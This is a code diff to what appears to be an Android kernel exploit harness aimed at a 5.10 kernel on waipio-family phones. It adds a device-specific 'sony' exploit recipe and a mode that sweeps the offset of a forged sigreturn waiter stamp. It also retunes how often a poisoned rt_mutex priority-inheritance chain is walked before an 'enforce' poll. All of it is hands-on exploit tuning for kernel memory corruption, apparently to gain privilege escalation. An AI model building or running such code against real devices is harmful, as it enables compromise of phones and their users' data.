@@ -34,6 +34,20 @@ int main(int argc, char **argv) {
      * word10 "prio_flat" entry in select_stack_route.cpp). Otherwise the
      * multicast_waiter route with the E3/E6a sigreturn stamp is emitted. */
     const bool select_recipe = argc > 2 && std::strcmp(argv[2], "select") == 0;
+    /* argv[2] == "sony" -> copy of the ONLY on-device-verified 5.10 recipe
+     * (Xperia 5 IV, same waipio SoC family, upstream #578): plain select_stack,
+     * NO compact waiter, collisions=4. October's katyusha select runs used the
+     * wrong mm_struct stride (1024 vs the measured 960 kept below) and the
+     * pre-E engine, so this exact combination has never run here. */
+    const bool sony_recipe = argc > 2 && std::strcmp(argv[2], "sony") == 0;
+    /* argv[2] == "waiter_off" argv[3]=N -> sweep the sigreturn stamp's waiter
+     * offset (default 320). E7 boot_id probe: if the write fires at some N,
+     * the stamp was misaligned relative to the real stale waiter and N is the
+     * correct alignment. */
+    int waiter_off_override = -1;
+    if (argc > 3 && std::strcmp(argv[2], "waiter_off") == 0) {
+        waiter_off_override = std::atoi(argv[3]);
+    }
     static const char kRelease[] = "5.10.101-android12-9-gece0cc04d1a5";
 
     profile::kernel_offsets p{};
@@ -101,6 +115,9 @@ int main(int argc, char **argv) {
     p.misc.mm_struct_sz = 0x3c0;
 
     p.geometry.mcast_waiter_off = 320;
+    if (waiter_off_override > 0) {
+        p.geometry.mcast_waiter_off = static_cast<uint32_t>(waiter_off_override);
+    }
     p.geometry.mcast_buffer_size = 528;
     p.geometry.mcast_task_offset = 48;
     p.geometry.mcast_lock_offset = 56;
@@ -135,8 +152,8 @@ int main(int argc, char **argv) {
     /* E1 (hypothesis A): one consume attempt per window is easy to lose to the
      * requeue/adjust race. Rotate nice 64x so rt_mutex_adjust_pi walks the
      * poisoned chain repeatedly while the route window is armed. */
-    p.execution.select_consumer_max_calls = 15; /* E3: deterministic write, no multi-call needed */
-    p.execution.select_consumer_burst_calls = 3; /* E3: single call safe */
+    p.execution.select_consumer_max_calls = 1; /* E6e: one walk, then poll enforce before any second walk can trip the mutated page tree */
+    p.execution.select_consumer_burst_calls = 1;
     p.execution.handoff_pre_dispatch_settle_ms = 2000;
     p.execution.handoff_module_poll_attempts = 30;
     p.execution.handoff_module_poll_interval_ms = 100;
